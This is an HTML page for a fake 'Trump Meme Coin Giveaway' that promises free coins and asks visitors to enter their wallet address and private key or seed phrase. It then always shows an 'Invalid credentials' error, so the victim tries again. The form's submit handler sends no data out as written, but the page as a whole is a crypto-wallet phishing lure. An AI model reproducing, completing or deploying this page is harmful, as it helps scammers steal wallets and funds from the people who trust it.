<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Trump Meme Coin Giveaway</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet"/>
  <style>
    body {
      font-family: 'Orbitron', sans-serif;
      margin: 0;
      background: #fff;
    }

    header, footer {
      text-align: center;
      padding: 20px;
      background-color: #f0f0f0;
    }

    .container {
      text-align: center;
      padding: 50px 20px;
    }

    button {
      background-color: #ffcc00;
      border: none;
      padding: 15px 30px;
      font-size: 1.2rem;
      cursor: pointer;
      border-radius: 10px;
    }

    button:hover {
      background-color: #ffdb4d;
    }

    .wallet-page {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.8);
      z-index: 1000;
      justify-content: center;
      align-items: center;
    }

    .wallet-inner {
      background: #fff;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
      width: 90%;
      max-width: 400px;
    }

    .wallet-inner input {
      width: 100%;
      margin-bottom: 15px;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1rem;
    }

    .wallet-inner button {
      width: 100%;
      padding: 12px;
      background-color: #ffcc00;
      font-size: 1.1rem;
      border: none;
      border-radius: 10px;
    }

    .wallet-inner button:hover {
      background-color: #ffdb4d;
    }

    #error-box {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      display: none;
      z-index: 2000;
      background: #ffe6e6;
      border: 1px solid #cc0000;
      color: #cc0000;
      font-size: 0.9rem;
      font-weight: bold;
      padding: 20px;
      text-align: center;
      border-radius: 10px;
      max-width: 300px;
      width: 80%;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
    }

    .blurred {
      filter: blur(6px);
      pointer-events: none;
    }

    .noscroll {
      overflow: hidden;
    }
  </style>
</head>
<body>

  <div id="blur-wrap">
    <header id="header">
      <h1>Trump Meme Coin Giveaway</h1>
    </header>

    <div class="container" id="main-content">
      <h2>Get Free Trump Meme Coins Instantly</h2>
      <p>Connect your wallet to claim your reward</p>
      <button onclick="showWalletPage()">Connect Wallet</button>
    </div>

    <footer id="footer">
      &copy; 2025 Trump Meme Coin. All rights reserved.
    </footer>

    <div class="wallet-page" id="wallet-page">
      <div class="wallet-inner">
        <h3>Connect Your Wallet</h3>
        <form id="wallet-form" onsubmit="return handleSubmit(event)">
          <input type="text" placeholder="Wallet Address" id="wallet-address" required/>
          <input type="password" placeholder="Private Key / Phrase" id="wallet-key" required/>
          <button type="submit">Connect</button>
        </form>
        <br />
        <button onclick="returnToMainPage()">Cancel</button>
      </div>
    </div>
  </div>

  <div id="error-box">Invalid credentials. Please try again.</div>

  <script>
    function showWalletPage() {
      document.getElementById('wallet-page').style.display = 'flex';
      document.getElementById('blur-wrap').classList.add('blurred');
      document.body.classList.add('noscroll');
    }

    function returnToMainPage() {
      document.getElementById('wallet-form').reset();
      document.getElementById('wallet-page').style.display = 'none';
      document.getElementById('blur-wrap').classList.remove('blurred');
      document.body.classList.remove('noscroll');
      document.getElementById("error-box").style.display = "none";
    }

    function handleSubmit(e) {
      e.preventDefault();
      // Simulate login failure
      document.getElementById("error-box").style.display = "block";
      return false;
    }
  </script>
</body>
</html>
